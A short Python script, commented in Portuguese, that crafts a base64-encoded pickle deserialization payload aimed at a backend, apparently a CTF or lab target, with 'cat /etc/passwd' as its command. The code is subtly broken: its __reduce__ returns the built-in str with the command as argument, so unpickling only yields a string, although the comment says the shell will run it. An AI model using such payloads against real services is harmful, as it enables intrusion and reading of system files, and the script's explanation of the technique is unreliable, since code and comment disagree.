import pickle
import base64

class Exploit:
    def __reduce__(self):
        # Retorna uma string, que será interpretada pelo shell
        return (str, ("cat /etc/passwd",))

# Serializa
payload = pickle.dumps(Exploit())

# Codifica em base64.urlsafe, igual ao backend
b64_payload = base64.urlsafe_b64encode(payload).decode()
print(b64_payload)